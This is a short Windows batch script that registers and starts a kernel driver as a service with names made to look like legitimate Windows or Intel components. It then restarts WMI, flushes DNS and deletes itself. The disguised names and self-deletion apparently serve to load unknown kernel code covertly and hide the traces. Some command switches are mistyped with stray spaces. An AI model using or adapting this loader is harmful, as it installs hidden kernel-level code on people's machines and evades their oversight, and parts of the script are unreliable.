@echo off
cd %~dp0
sc create WindowsTrustedRT_5963 binpath=C:\Windows\System32\drivers\iaLPSSi_TWL.sys type=kernel
sc start WindowsTrustedRT_5963
net stop winmgmt / y
net start winmgmt / y
sc stop winmgmt
sc start winmgmt
ipconfig / flushdns
del "%~f0"